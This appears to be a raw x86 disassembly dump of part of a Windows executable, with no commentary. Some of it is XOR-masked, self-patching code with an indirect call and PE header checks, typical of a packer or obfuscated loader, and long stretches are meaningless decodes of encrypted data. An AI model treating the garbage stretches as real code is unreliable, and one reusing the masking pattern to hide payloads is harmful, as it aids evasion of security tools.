  409fca:	mov    eax,DWORD PTR [ebp+0x10]
  409fcd:	add    eax,DWORD PTR [ebp+0xc]
  409fd0:	push   eax
  409fd1:	call   0x403861
  409fd6:	inc    DWORD PTR [ebp+0xc]
  409fd9:	cmp    DWORD PTR [ebp+0xc],0x52
  409fdd:	jb     0x409fc3
  409fe3:	mov    eax,DWORD PTR [ebp-0x8]
  409fe6:	mov    eax,ds:0x4121a8
  409feb:	mov    DWORD PTR [ebp+0x10],eax
  409fee:	mov    eax,ds:0x4122b4
  409ff3:	mov    DWORD PTR [ebp-0x68],eax
  409ff6:	mov    DWORD PTR [ebp+0xc],0xf89c8535
  409ffd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  40a004:	mov    eax,DWORD PTR [ebp+0xc]
  40a007:	xor    eax,esi
  40a009:	add    eax,ebx
  40a00b:	mov    DWORD PTR [ebp-0x7c],eax
  40a00e:	mov    DWORD PTR [ebp-0x70],0xf89cb535
  40a015:	mov    DWORD PTR [ebp-0x84],0xf89f0535
  40a01f:	mov    DWORD PTR [ebp-0x78],edi
  40a022:	mov    DWORD PTR [ebp-0x64],0xf89c85d5
  40a029:	mov    eax,DWORD PTR [ebp+0xc]
  40a02c:	xor    eax,esi
  40a02e:	add    eax,ebx
  40a030:	mov    DWORD PTR [ebp-0x38],eax
  40a033:	mov    DWORD PTR [ebp-0x48],0xf89c853e
  40a03a:	mov    BYTE PTR [ebp-0x29],0x57
  40a03e:	mov    eax,DWORD PTR [ebp+0xc]
  40a041:	xor    eax,esi
  40a043:	add    eax,ebx
  40a045:	mov    DWORD PTR [ebp-0x38],eax
  40a048:	mov    eax,DWORD PTR [ebp-0x64]
  40a04b:	xor    eax,esi
  40a04d:	add    eax,ebx
  40a04f:	push   eax
  40a050:	mov    eax,DWORD PTR [ebp-0x70]
  40a053:	xor    eax,esi
  40a055:	add    eax,ebx
  40a057:	push   eax
  40a058:	mov    eax,DWORD PTR [ebp-0x48]
  40a05b:	xor    eax,esi
  40a05d:	add    eax,ebx
  40a05f:	push   eax
  40a060:	lea    eax,[ebp-0x10c]
  40a066:	push   eax
  40a067:	push   DWORD PTR [ebp+0xc]
  40a06a:	push   DWORD PTR [ebp-0x4]
  40a06d:	call   0x40834f
  40a072:	test   eax,eax
  40a074:	je     0x40a0a5
  40a07a:	lea    eax,[ebp-0x10c]
  40a080:	push   eax
  40a081:	mov    eax,DWORD PTR [ebp-0x4]
  40a084:	xor    eax,esi
  40a086:	add    eax,ebx
  40a088:	push   eax
  40a089:	mov    eax,DWORD PTR [ebp+0x10]
  40a08c:	add    eax,0xaa
  40a091:	push   eax
  40a092:	mov    eax,DWORD PTR [ebp+0x10]
  40a095:	mov    eax,DWORD PTR [eax+0x198]
  40a09b:	push   DWORD PTR [eax]
  40a09d:	call   0x40b2c8
  40a0a2:	mov    DWORD PTR [ebp-0x24],eax
  40a0a5:	cmp    DWORD PTR [ebp-0x24],0x0
  40a0a9:	lea    edi,[ebp+0x4]
  40a0ac:	mov    DWORD PTR [ebp-0x7c],edi
  40a0af:	je     0x40a179
  40a0b5:	lea    eax,[ebp-0x38]
  40a0b8:	push   eax
  40a0b9:	mov    eax,DWORD PTR [ebp-0x78]
  40a0bc:	xor    eax,esi
  40a0be:	add    eax,ebx
  40a0c0:	push   eax
  40a0c1:	mov    eax,DWORD PTR [ebp-0x48]
  40a0c4:	xor    eax,esi
  40a0c6:	add    eax,ebx
  40a0c8:	push   eax
  40a0c9:	push   DWORD PTR [ebp-0x24]
  40a0cc:	lea    eax,[ebp-0x10c]
  40a0d2:	push   eax
  40a0d3:	push   DWORD PTR [ebp+0xc]
  40a0d6:	push   DWORD PTR [ebp-0x4]
  40a0d9:	call   0x408a84
  40a0de:	test   eax,eax
  40a0e0:	je     0x40a10e
  40a0e6:	lea    eax,[ebp-0x10c]
  40a0ec:	push   eax
  40a0ed:	mov    eax,DWORD PTR [ebp-0x4]
  40a0f0:	xor    eax,esi
  40a0f2:	add    eax,ebx
  40a0f4:	push   eax
  40a0f5:	mov    eax,DWORD PTR [ebp+0x10]
  40a0f8:	add    eax,0xee
  40a0fd:	push   eax
  40a0fe:	mov    eax,DWORD PTR [ebp+0x10]
  40a101:	mov    eax,DWORD PTR [eax+0x198]
  40a107:	push   DWORD PTR [eax]
  40a109:	call   0x40b2c8
  40a10e:	mov    ecx,DWORD PTR [ebp-0x48]
  40a111:	xor    ecx,esi
  40a113:	mov    eax,0xffcd8d63
  40a118:	sub    eax,ecx
  40a11a:	sub    eax,DWORD PTR [ebp-0x24]
  40a11d:	mov    ecx,DWORD PTR [ebp-0x68]
  40a120:	add    ecx,eax
  40a122:	mov    eax,DWORD PTR [ebp-0x24]
  40a125:	mov    DWORD PTR [eax+0x1],ecx
  40a128:	mov    al,BYTE PTR [ebp-0x29]
  40a12b:	mov    ecx,DWORD PTR [ebp-0x24]
  40a12e:	xor    al,0x48
  40a130:	sub    al,0x36
  40a132:	mov    BYTE PTR [ecx],al
  40a134:	lea    eax,[ebp-0x24]
  40a137:	inc    BYTE PTR [eax]
  40a139:	inc    eax
  40a13a:	push   eax
  40a13b:	pop    ecx
  40a13c:	dec    ecx
  40a13d:	xchg   ecx,edx
  40a13f:	dec    BYTE PTR [edx]
  40a141:	push   DWORD PTR [ebp+0x10]
  40a144:	mov    eax,ds:0x412264
  40a149:	mov    eax,DWORD PTR [eax]
  40a14b:	push   DWORD PTR [eax]
  40a14d:	lea    eax,ds:0x412280
  40a153:	push   DWORD PTR [eax]
  40a155:	lea    eax,ds:0x41202c
  40a15b:	push   DWORD PTR [eax]
  40a15d:	lea    eax,ds:0x412260
  40a163:	push   DWORD PTR [eax]
  40a165:	lea    eax,ds:0x41237c
  40a16b:	push   DWORD PTR [eax]
  40a16d:	xchg   ebx,edx
  40a16f:	inc    ebx
  40a170:	inc    ebx
  40a171:	sub    ebx,0x3
  40a174:	push   ebx
  40a175:	pop    eax
  40a176:	call   DWORD PTR [eax+0x1]
  40a179:	mov    DWORD PTR [ebp-0x6c],edi
  40a17c:	mov    eax,DWORD PTR [ebp-0x3c]
  40a17f:	mov    eax,DWORD PTR [ebp-0x18]
  40a182:	push   DWORD PTR [ebp-0x20]
  40a185:	lea    eax,[ebp-0x6c]
  40a188:	push   eax
  40a189:	call   0x406433
  40a18e:	mov    eax,ds:0x4121a8
  40a193:	push   0x4
  40a195:	add    eax,0x1cc
  40a19a:	push   eax
  40a19b:	lea    eax,[ebp-0x3c]
  40a19e:	push   eax
  40a19f:	call   0x4052e7
  40a1a4:	mov    eax,DWORD PTR [ebp-0x3c]
  40a1a7:	mov    eax,DWORD PTR [eax]
  40a1a9:	pop    edi
  40a1aa:	pop    esi
  40a1ab:	pop    ebx
  40a1ac:	leave  
  40a1ad:	ret    0xc
  40a1b0:	push   ebp
  40a1b1:	mov    ebp,esp
  40a1b3:	sub    esp,0x20
  40a1b6:	leave  
  40a1b7:	ret    0x4
  40a1ba:	push   ebp
  40a1bb:	mov    ebp,esp
  40a1bd:	push   ecx
  40a1be:	and    DWORD PTR ds:0x430656,edx
  40a1c4:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40a1cb:	mov    eax,DWORD PTR [ebp+0x8]
  40a1ce:	or     DWORD PTR ds:0x42ef30,0x430652
  40a1d8:	mov    al,BYTE PTR [eax]
  40a1da:	adc    DWORD PTR ds:0x42ef10,0x639e
  40a1e4:	add    al,0x36
  40a1e6:	sbb    DWORD PTR ds:0x4305a2,0x596d
  40a1f0:	xor    al,0x48
  40a1f2:	mov    DWORD PTR ds:0x43064e,0x7356
  40a1fc:	cmp    al,0xcb
  40a1fe:	mov    DWORD PTR ds:0x4305b2,0x64e0
  40a208:	jne    0x40a51c
  40a20e:	xor    DWORD PTR ds:0x4305b6,0x7c62
  40a218:	jmp    0x40a496
  40a21d:	lods   al,BYTE PTR ds:[esi]
  40a21e:	inc    edx
  40a21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a220:	es jge 0x40a21c
  40a223:	lods   eax,DWORD PTR ds:[esi]
  40a224:	inc    esp
  40a225:	pop    ecx
  40a226:	push   cs
  40a227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a228:	mov    ds:0x150ccfef,eax
  40a22d:	rcl    esi,cl
  40a22f:	jle    0x40a2af
  40a231:	fbstp  TBYTE PTR [eax+0x7e]
  40a234:	jle    0x40a206
  40a236:	pop    eax
  40a237:	xor    ah,BYTE PTR [ecx]
  40a239:	cmp    ah,al
  40a23b:	js     0x40a210
  40a23d:	xor    BYTE PTR [edx],ah
  40a23f:	mov    ecx,0xef36d25f
  40a244:	xchg   esp,eax
  40a245:	imul   eax,DWORD PTR [ecx+ecx*2+0x426ded07],0xffffffd0
  40a24d:	inc    esi
  40a24e:	jle    0x40a2a2
  40a250:	pop    es
  40a251:	sbb    edx,edi
  40a253:	rol    ch,1
  40a255:	(bad)
  40a258:	outs   dx,DWORD PTR ds:[esi]
  40a259:	jl     0x40a292
  40a25b:	int3   
  40a25c:	jbe    0x40a2dd
  40a25e:	mov    BYTE PTR [ebp+0x28],al
  40a261:	loope  0x40a21e
  40a263:	jne    0x40a226
  40a265:	sub    al,0x4f
  40a267:	fidivr WORD PTR [esi+0x3b]
  40a26a:	pop    ds
  40a26b:	cmc    
  40a26c:	inc    edi
  40a26d:	test   al,0xf7
  40a26f:	add    eax,0x3afc8afa
  40a274:	fbstp  TBYTE PTR [edi+0x5d73d75f]
  40a27a:	pop    ecx
  40a27b:	jmp    0xdb01:0xf61eb6d6
  40a282:	or     ch,BYTE PTR [edi]
  40a284:	(bad)  
  40a285:	scas   eax,DWORD PTR es:[edi]
  40a286:	xchg   edi,eax
  40a287:	dec    edi
  40a288:	mov    edi,0xeb08863d
  40a28d:	rol    DWORD PTR [ecx],cl
  40a28f:	(bad)  
  40a290:	dec    ecx
  40a291:	add    dh,0x6a
  40a294:	(bad)  
  40a295:	xchg   ebp,eax
  40a296:	(bad)  [ebx]
  40a298:	pusha  
  40a299:	jmp    0x5078b181
  40a29e:	and    bh,BYTE PTR ds:0x228ec7f2
  40a2a4:	add    ch,bh
  40a2a6:	clc    
  40a2a7:	xchg   edi,eax
  40a2a8:	inc    ebx
  40a2a9:	or     bl,dh
  40a2ab:	dec    ebx
  40a2ac:	(bad)  
  40a2ad:	pop    ss
  40a2ae:	mov    al,0x68
  40a2b0:	leave  
  40a2b1:	mov    ds:0x4861050e,eax
  40a2b6:	sub    eax,0x6ed08b34
  40a2bb:	pop    ebp
  40a2bc:	dec    esp
  40a2bd:	imul   eax,edi,0x874e42fd
  40a2c3:	jae    0x40a32d
  40a2c5:	hlt    
  40a2c6:	std    
  40a2c7:	aam    0xb
  40a2c9:	ins    BYTE PTR es:[edi],dx
  40a2ca:	xchg   edx,eax
  40a2cb:	xor    esp,DWORD PTR [ebp-0x48eee25d]
  40a2d1:	std    
  40a2d2:	xor    bl,cl
  40a2d4:	add    al,0xff
  40a2d7:	shr    BYTE PTR ds:0x3bc0fe05,1
  40a2dd:	mov    cl,al
  40a2df:	gs in  al,0xd8
  40a2e2:	dec    esp
  40a2e3:	icebp  
  40a2e4:	popa   
  40a2e5:	adc    BYTE PTR [ebp+0x4c7fa1e6],cl
  40a2eb:	sbb    al,0x4d
  40a2ed:	test   BYTE PTR [ebx],bl
  40a2ef:	sbb    al,al
  40a2f1:	mov    fs,WORD PTR [ebx+ebp*8]
  40a2f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2f5:	into   
  40a2f6:	test   al,0x7d
  40a2f8:	sti    
  40a2f9:	mov    ds,ecx
  40a2fb:	ins    BYTE PTR es:[edi],dx
  40a2fc:	push   edi
  40a2fd:	sub    eax,0xe289fc7c
  40a302:	sbb    al,0x51
  40a304:	mov    bh,0x9d
  40a306:	out    dx,eax
  40a307:	xchg   esi,eax
  40a308:	and    eax,0x57baf3f9
  40a30d:	popf   
  40a30e:	jmp    0x94c36201
  40a313:	loope  0x40a32a
  40a315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a316:	jae    0x40a33e
  40a318:	test   ebx,eax
  40a31a:	aaa    
  40a31b:	cld    
  40a31c:	inc    ebx
  40a31d:	add    al,0x65
  40a31f:	jmp    0x40a372
  40a321:	retf   0x55ba
  40a324:	and    cl,ah
  40a326:	and    DWORD PTR ds:0xdd196642,esi
  40a32c:	adc    BYTE PTR [esi-0x63],ch
  40a32f:	inc    edi
  40a330:	mov    ecx,0x883f4bde
  40a335:	lods   al,BYTE PTR ds:[esi]
  40a336:	and    ecx,DWORD PTR [edx]
  40a338:	ret    
  40a339:	mov    BYTE PTR [edi],ah
  40a33b:	xor    al,0x5e
  40a33d:	adc    BYTE PTR [eax-0x62eefed2],ch
  40a343:	scas   eax,DWORD PTR es:[edi]
  40a344:	hlt    
  40a345:	jmp    0x6daa1e66
  40a34a:	fwait
  40a34b:	sar    DWORD PTR [edx],0x1a
  40a34e:	and    al,0x3f
  40a350:	cmp    DWORD PTR [eax-0x7705caf0],esp
  40a356:	inc    esp
  40a357:	mov    ecx,0xdb15bd85
  40a35c:	(bad)  
  40a35d:	sub    DWORD PTR [ebp+0x8c01df1],eax
  40a363:	jns    0x40a3c4
  40a365:	shl    BYTE PTR [ebx-0x622a8515],cl
  40a36b:	inc    edi
  40a36c:	iret   
  40a36d:	icebp  
  40a36e:	dec    esp
  40a36f:	aas    
  40a370:	mov    ch,0xa0
  40a372:	jb     0x40a398
  40a374:	test   DWORD PTR [ecx+ebp*8],ecx
  40a377:	and    DWORD PTR [ecx+esi*4-0x35],edx
  40a37b:	sbb    dl,0x39
  40a37e:	sahf   
  40a37f:	xor    ebp,DWORD PTR [ebp+0x4a]
  40a382:	mov    ch,0x96
  40a384:	fwait
  40a385:	push   0xffffffd3
  40a387:	rol    BYTE PTR [edi-0x4e],cl
  40a38a:	inc    ebp
  40a38b:	stc    
  40a38c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a38d:	fimul  WORD PTR [eax]
  40a38f:	outs   dx,DWORD PTR ds:[esi]
  40a390:	out    dx,eax
  40a391:	mov    ecx,0xbc46f681
  40a396:	test   eax,0xf3f0b176
  40a39b:	inc    edx
  40a39c:	cmp    DWORD PTR [ebx+0x75dd6e5d],ecx
  40a3a2:	sbb    DWORD PTR [esi-0x662c66e5],ebp
  40a3a8:	outs   dx,BYTE PTR fs:[esi]
  40a3aa:	stos   BYTE PTR es:[edi],al
  40a3ab:	pop    es
  40a3ac:	mov    eax,0x88b1ed14
  40a3b1:	pop    edi
  40a3b2:	push   edi
  40a3b3:	mov    edi,0x7b3df290
  40a3b8:	and    BYTE PTR [edi+0x6ade4391],0x95
  40a3bf:	sub    al,0xeb
  40a3c1:	sbb    BYTE PTR [edi+0x3d],ch
  40a3c4:	lea    edx,ds:0x18ad74af
  40a3ca:	in     eax,dx
  40a3cb:	ja     0x40a3c5
  40a3cd:	ds jne 0x40a37f
  40a3d0:	push   0x1f
  40a3d2:	mov    ss:0xb6496243,eax
  40a3d8:	rcr    BYTE PTR [edi],cl
  40a3da:	ret    0x6eae
  40a3dd:	add    al,0xfd
  40a3df:	mul    ebp
  40a3e1:	or     al,0x25
  40a3e3:	lock xor al,0xf9
  40a3e6:	imul   ecx,DWORD PTR [esi-0x4f3aa198],0x73a044de
  40a3f0:	mov    ebp,0xec2facb6
  40a3f5:	inc    BYTE PTR [edx-0x6c892f6e]
  40a3fb:	inc    esi
  40a3fc:	cmp    DWORD PTR [ebx+0x35],eax
  40a3ff:	(bad)  
  40a400:	mov    edi,esi
  40a402:	fcomp  DWORD PTR [ebx+esi*8-0x4f]
  40a406:	(bad)  
  40a407:	bts    DWORD PTR [esi],edi
  40a40a:	add    edx,DWORD PTR [edx-0xb5bfb2d]
  40a410:	sub    al,0x14
  40a412:	mov    edx,0x5c23ae63
  40a417:	jl     0x40a3a4
  40a419:	inc    eax
  40a41a:	hlt    
  40a41b:	push   ecx
  40a41c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a41d:	ins    DWORD PTR es:[edi],dx
  40a41e:	mov    al,ds:0xcb33c976
  40a423:	cmc    
  40a424:	jo     0x40a3ad
  40a426:	add    al,0x2
  40a428:	xor    bl,BYTE PTR ds:0xded52442
  40a42e:	cdq    
  40a42f:	enter  0x8926,0x1e
  40a433:	jle    0x40a42e
  40a435:	(bad)  
  40a436:	cmp    al,0x63
  40a438:	pop    edi
  40a439:	jmp    0x47ac:0x1b4a292e
  40a440:	jns    0x40a3f7
  40a442:	in     al,dx
  40a443:	hlt    
  40a444:	(bad)  
  40a445:	pop    si
  40a447:	mov    edi,0x77720d37
  40a44c:	inc    esi
  40a44d:	ss jle 0x40a4b1
  40a450:	or     DWORD PTR [eax-0x79],ebx
  40a453:	dec    ebp
  40a454:	loop   0x40a47f
  40a456:	pop    esi
  40a457:	add    DWORD PTR ds:0x53f69d0e,esi
  40a45d:	sahf   
  40a45e:	repz les edi,FWORD PTR [edi]
  40a461:	pop    ebp
  40a462:	fisubr DWORD PTR [ebp-0x6d9e7a44]
  40a468:	aas    
  40a469:	out    dx,al
  40a46a:	shl    BYTE PTR [ebp-0x4084ad2d],cl
  40a470:	sub    BYTE PTR [ecx],cl
  40a472:	fcomi  st,st(2)
  40a474:	push   ss
  40a475:	mov    edx,DWORD PTR [ebx+0x67246b62]
  40a47b:	mov    bh,ah
  40a47d:	shr    DWORD PTR [esi],cl
  40a47f:	hlt    
  40a480:	mov    eax,ds:0x75548ae2
  40a485:	mov    ebx,0xbd308d4a
  40a48a:	aaa    
  40a48b:	aam    0x59
  40a48d:	push   ebp
  40a48e:	aam    0x91
  40a490:	or     eax,0xd71fc222
  40a495:	stos   BYTE PTR es:[edi],al
  40a496:	mov    eax,DWORD PTR [ebp+0x8]
  40a499:	mov    DWORD PTR ds:0x430642,0x17
  40a4a3:	cmp    DWORD PTR ds:0x430642,0x0
  40a4aa:	je     0x40a4d8
  40a4b0:	cmp    DWORD PTR ds:0x430642,0x24
  40a4b7:	jne    0x40a4c6
  40a4bd:	push   DWORD PTR [ebp-0x28]
  40a4c0:	call   DWORD PTR ds:0x42ebe4
  40a4c6:	mov    ecx,DWORD PTR ds:0x430642
  40a4cc:	dec    ecx
  40a4cd:	mov    DWORD PTR ds:0x430642,ecx
  40a4d3:	jmp    0x40a4a3
  40a4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  40a4db:	sub    edx,0x356a
  40a4e1:	add    ecx,DWORD PTR [eax+0x3c]
  40a4e4:	and    eax,edx
  40a4e6:	mov    edx,0x7510856
  40a4eb:	mov    DWORD PTR [ebp+0x8],ecx
  40a4ee:	mov    eax,DWORD PTR [ebp-0x4]
  40a4f1:	xor    eax,edx
  40a4f3:	push   esi
  40a4f4:	mov    esi,DWORD PTR [ebp+0x8]
  40a4f7:	mov    ecx,0x32729d
  40a4fc:	add    eax,ecx
  40a4fe:	cmp    DWORD PTR [esi+0x54],eax
  40a501:	pop    esi
  40a502:	je     0x40a510
  40a508:	mov    eax,DWORD PTR [ebp+0x8]
  40a50b:	jmp    0x40a7a7
  40a510:	mov    eax,DWORD PTR [ebp-0x4]
  40a513:	xor    eax,edx
  40a515:	add    eax,ecx
  40a517:	jmp    0x40a7a7
  40a51c:	mov    eax,DWORD PTR [ebp-0x4]
  40a51f:	xor    eax,0x7510856
  40a524:	jmp    0x40a7a2
  40a529:	mov    esi,edi
  40a52b:	pop    ds
  40a52c:	outs   dx,BYTE PTR ds:[esi]
  40a52d:	adc    esp,DWORD PTR [esi+0x5b]
  40a530:	jnp    0x40a586
  40a532:	xor    eax,0x1b08a360
  40a537:	aam    0x9a
  40a539:	mov    ah,0xe8
  40a53b:	jle    0x40a5bb
  40a53d:	fbstp  TBYTE PTR [eax+0x7e]
  40a540:	jle    0x40a4d4
  40a542:	or     BYTE PTR [ebp+0x44],cl
  40a545:	repnz pop ebx
  40a547:	or     BYTE PTR [edi+eiz*4+0x18],0x64
  40a54c:	inc    edi
  40a54d:	sti    
  40a54e:	aam    0x56
  40a550:	pop    ss
  40a551:	and    BYTE PTR ds:0xd3cfe73f,al
  40a557:	inc    ebx
  40a558:	and    edx,ebp
  40a55a:	shl    BYTE PTR [esi+0x2a4a5918],cl
  40a560:	pop    ds
  40a561:	push   ebx
  40a562:	dec    ebx
  40a563:	jge    0x40a501
  40a565:	pop    ecx
  40a566:	mov    ds:0x67c44f0,al
  40a56b:	ds shl edx,1
  40a56e:	adc    al,0xa0
  40a570:	fwait
  40a571:	mov    ebp,0xbbc4b52d
  40a576:	add    edi,DWORD PTR [eax+0x34]
  40a579:	fstp   DWORD PTR [ebp-0x7147cd9f]
  40a57f:	sar    BYTE PTR [ecx+ebp*4+0x490c3181],cl
  40a586:	loope  0x40a5dd
  40a588:	enter  0x61b8,0xea
  40a58c:	or     edx,DWORD PTR [eax]
  40a58e:	adc    edi,ebp
  40a590:	xchg   edi,eax
  40a591:	inc    edi
  40a592:	add    edi,DWORD PTR [ecx+0x13c5e2f2]
  40a598:	dec    edi
  40a599:	(bad)  
  40a59b:	stc    
  40a59c:	jne    0x40a561
  40a59e:	cmp    BYTE PTR [ebp+0x9],0x3a
  40a5a2:	jne    0x40a54e
  40a5a4:	jl     0x40a56a
  40a5a6:	ins    DWORD PTR es:[edi],dx
  40a5a7:	not    DWORD PTR [edi+0x2]
  40a5aa:	dec    edx
  40a5ab:	inc    esi
  40a5ac:	inc    ebx
  40a5ad:	or     al,0xa7
  40a5af:	mov    ds:0x7f09b83,eax
  40a5b4:	or     BYTE PTR [eax-0x2a96ff44],cl
  40a5ba:	jnp    0x40a633
  40a5bc:	mov    dl,0x11
  40a5be:	div    BYTE PTR [eax+0x631c2380]
  40a5c4:	mov    edx,DWORD PTR [edi]
  40a5c6:	xor    BYTE PTR [ebx+ebx*4-0x3b],0xad
  40a5cb:	cmp    ebp,edx
  40a5cd:	cmp    eax,0xf6fd5100
  40a5d2:	cwde   
  40a5d3:	xchg   ch,al
  40a5d5:	into   
  40a5d6:	in     eax,dx
  40a5d7:	jns    0x40a61b
  40a5d9:	enter  0xb32c,0xae
  40a5dd:	xchg   ebp,eax
  40a5de:	mov    dh,0x30
  40a5e0:	or     BYTE PTR ds:0xab39daf2,ch
  40a5e6:	xchg   BYTE PTR [esi*4-0x7cad619a],al
  40a5ed:	pop    ebp
  40a5ee:	mov    cl,0x37
  40a5f0:	(bad)  
  40a5f1:	cmp    esp,ebx
  40a5f3:	fld    QWORD PTR [eax-0x16]
  40a5f6:	neg    dh
  40a5f8:	push   ebx
  40a5f9:	js     0x40a5f7
  40a5fb:	jnp    0x40a5a5
  40a5fd:	or     BYTE PTR [ebx+0x36],cl
  40a600:	jns    0x40a622
  40a602:	test   ch,al
  40a604:	stc    
  40a605:	mov    al,ds:0xbb6972c
  40a60a:	lock shl DWORD PTR [ecx],cl
  40a60d:	add    esp,DWORD PTR [ecx]
  40a60f:	jmp    0x40a5ce
  40a611:	fmul   st,st(1)
  40a613:	sbb    DWORD PTR [ebp-0x3266a652],edi
  40a619:	or     dh,BYTE PTR [edi+edx*4]
  40a61c:	push   es
  40a61d:	cli    
  40a61e:	sahf   
  40a61f:	rol    BYTE PTR [ebx-0x4b],cl
  40a622:	hlt    
  40a623:	lds    edi,FWORD PTR [edx+0x7]
  40a626:	jl     0x40a5bf
  40a628:	inc    edx
  40a629:	dec    BYTE PTR [eax]
  40a62b:	stc    
  40a62c:	dec    edx
  40a62d:	(bad)  
  40a62e:	fld    DWORD PTR [esp-0x2b]
  40a632:	inc    DWORD PTR [ebp-0x7d91f2f6]
  40a638:	int    0x9b
  40a63a:	sub    DWORD PTR [ebx],ecx
  40a63c:	and    al,0x9b
  40a63e:	push   edx
  40a63f:	mov    ds:0x30f3ee5d,al
  40a644:	lea    edx,[esi]
  40a646:	add    ecx,DWORD PTR [ecx-0x197572e0]
  40a64c:	mov    DWORD PTR [edx],ebx
  40a64e:	je     0x40a639
  40a650:	mov    bh,0x7
  40a652:	dec    edi
  40a653:	sbb    ch,BYTE PTR [esi-0x2e62f75c]
  40a659:	jns    0x40a695
  40a65b:	sbb    DWORD PTR [esi+0x35e59408],edx
  40a661:	pop    es
  40a662:	pushf  
  40a663:	aad    0xe8
  40a665:	dec    esp
  40a666:	xor    BYTE PTR [eax-0x1b59a309],al
  40a66c:	repnz xor ecx,DWORD PTR [esi]
  40a66f:	dec    esp
  40a670:	das    
  40a671:	xchg   ebx,eax
  40a672:	mov    ebx,0x27511262
  40a677:	dec    ecx
  40a678:	(bad)  
  40a679:	mov    ds:0x8ab38314,al
  40a67e:	out    0x30,al
  40a680:	xchg   DWORD PTR [ecx-0x45f88bd],eax
  40a686:	bound  ebx,QWORD PTR [eax-0xd643603]
  40a68c:	in     al,dx
  40a68d:	mov    edx,0x71a9bda2
  40a692:	jb     0x40a637
  40a694:	clc    
  40a695:	cmp    eax,0xc516cb09
  40a69a:	xlat   BYTE PTR ds:[ebx]
  40a69b:	fidiv  WORD PTR [ebx-0x560654ba]
  40a6a1:	(bad)  
  40a6a2:	addr16 sahf 
  40a6a4:	xchg   esp,esi
  40a6a6:	test   eax,0xb6d4dfc6
  40a6ab:	cmp    dl,bl
  40a6ad:	cmp    DWORD PTR [eax-0x10],ecx
  40a6b0:	sti    
  40a6b1:	or     BYTE PTR [esi+0x68205e31],bh
  40a6b7:	push   0x6e
  40a6b9:	adc    BYTE PTR [ebx+0x3312e3f4],cl
  40a6bf:	loope  0x40a6a9
  40a6c1:	stos   BYTE PTR es:[edi],al
  40a6c2:	mov    ecx,DWORD PTR [esi]
  40a6c4:	jae    0x40a68e
  40a6c6:	std    
  40a6c7:	(bad)  
  40a6c8:	div    BYTE PTR [esi]
  40a6ca:	jle    0x40a6e7
  40a6cc:	push   esi
  40a6cd:	jp     0x40a734
  40a6cf:	or     esi,DWORD PTR [edi]
  40a6d1:	mov    dl,BYTE PTR [eax+0x48a00934]
  40a6d7:	out    dx,eax
  40a6d8:	inc    eax
  40a6d9:	jo     0x40a6eb
  40a6db:	fdivr  DWORD PTR [ebp-0x377ea967]
  40a6e1:	out    0xa6,eax
  40a6e3:	or     BYTE PTR [edi],ch
  40a6e5:	xchg   ecx,eax
  40a6e6:	test   BYTE PTR [edx],bl
  40a6e8:	push   0xbf531bcf
  40a6ed:	clc    
  40a6ee:	repnz cwde 
  40a6f0:	(bad)  
  40a6f2:	or     eax,0x8f6c0770
  40a6f7:	sbb    ah,bl
  40a6f9:	shr    esp,cl
  40a6fb:	xor    al,0x72
  40a6fd:	(bad)  
  40a6fe:	aad    0x7b
  40a700:	push   edi
  40a701:	ret    
  40a702:	add    eax,0x2f9b6173
  40a707:	or     al,0xd7
  40a709:	sbb    BYTE PTR [eax+0x34],cl
  40a70c:	dec    esi
  40a70d:	es cli 
  40a70f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a710:	jecxz  0x40a701
  40a712:	or     dh,al
  40a714:	jne    0x40a6c1
  40a716:	push   esi
  40a717:	push   edi
  40a718:	js     0x40a6ee
  40a71a:	fmul   DWORD PTR [ebx-0x4e8493a2]
  40a720:	ror    BYTE PTR [ebp+0x75fbb18f],0x9f
  40a727:	imul   DWORD PTR ds:0x727d3a4d
  40a72d:	fcmovnbe st,st(6)
  40a72f:	cmp    bl,BYTE PTR [eax]
  40a731:	js     0x40a76b
  40a733:	pop    ebx
  40a734:	call   0xf6a01068
  40a739:	mov    al,ds:0x1cc7bb60
  40a73e:	lods   al,BYTE PTR ds:[esi]
  40a73f:	std    
  40a740:	jp     0x40a6d0
  40a742:	push   edi
  40a743:	sbb    BYTE PTR [ebx],cl
  40a745:	mov    al,ds:0x34e79647
  40a74a:	mov    ch,0x8
  40a74c:	ficomp WORD PTR [eax+0x23f26e6b]
  40a752:	sbb    BYTE PTR [eax+eax*1+0x2500e522],0x1b
  40a75a:	retf   0x57fc
  40a75d:	push   es
  40a75e:	sbb    eax,0xd900a71f
  40a763:	xor    bl,al
  40a765:	daa    
  40a766:	inc    ebx
  40a767:	dec    DWORD PTR [esi+eax*2]
  40a76a:	fdivp  st(3),st
  40a76c:	dec    ecx
  40a76d:	jg     0x40a7cf
  40a76f:	mov    eax,0x3609e2d7
  40a774:	jb     0x40a76c
  40a776:	xchg   ebp,eax
  40a777:	xor    DWORD PTR [edi+0x1f09f0af],0xfffffff2
  40a77e:	xor    ebx,DWORD PTR [eax+0x1deee515]
  40a784:	fstp   DWORD PTR [esi+0x6d4eef4d]
  40a78a:	stos   DWORD PTR es:[edi],eax
  40a78b:	je     0x40a78e
  40a78d:	cld    
  40a78e:	fwait
  40a78f:	jae    0x40a77a
  40a791:	jge    0x40a76b
  40a793:	sahf   
  40a794:	int    0x17
  40a796:	arpl   WORD PTR [esi],ax
  40a798:	sub    eax,0xad0dd7fc
  40a79d:	dec    ebx
  40a79e:	xor    BYTE PTR [ecx-0x62fa3348],ah
  40a7a4:	jb     0x40a7d8
  40a7a6:	add    cl,cl
  40a7a8:	ret    0x4
  40a7ab:	push   ebp
  40a7ac:	mov    ebp,esp
  40a7ae:	push   ecx
  40a7af:	inc    eax
  40a7b0:	push   ecx
  40a7b1:	and    DWORD PTR ds:0x43059e,0x0
  40a7bb:	jmp    0x40a7cb
  40a7c0:	mov    eax,ds:0x43059e
  40a7c5:	inc    eax
  40a7c6:	mov    ds:0x43059e,eax
  40a7cb:	cmp    DWORD PTR ds:0x43059e,0x10
  40a7d2:	jae    0x40a821
  40a7d8:	cmp    DWORD PTR ds:0x43059e,0x9
  40a7df:	jne    0x40a7f1
  40a7e5:	push   DWORD PTR [ebp-0x24]
  40a7e8:	push   DWORD PTR [ebp-0x10]
